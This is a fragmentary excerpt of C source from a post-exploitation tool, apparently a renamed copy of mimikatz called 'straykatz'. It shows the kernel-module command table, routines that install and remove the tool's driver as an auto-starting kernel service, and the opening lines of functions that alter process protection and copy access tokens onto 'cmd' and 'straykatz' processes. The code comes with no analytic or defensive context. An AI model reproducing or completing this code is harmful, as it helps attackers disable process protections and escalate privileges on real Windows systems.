...
const KUHL_K_C kuhl_k_c_kernel[] = {
	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start straykatz driver (mimidrv)"},
	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove straykatz driver (mimidrv)"},
...
{
	wchar_t *absFile;
	if(kull_m_file_getAbsolutePathOf(straykatz_DRIVER L".sys", &absFile))
	{
		if(kull_m_file_isFileExist(absFile))
			kull_m_service_install(straykatz_DRIVER, straykatz L" driver (" straykatz_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
...
{
	kull_m_service_uninstall(straykatz_DRIVER);
	return STATUS_SUCCESS;
}
...
NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
{
	...
	if(straykatz_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
	{
...
NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
	...
	if(!tokenInfo.toProcessId)
		kprintf(L" * to 0 will take all \'cmd\' and \'straykatz\' process\n");
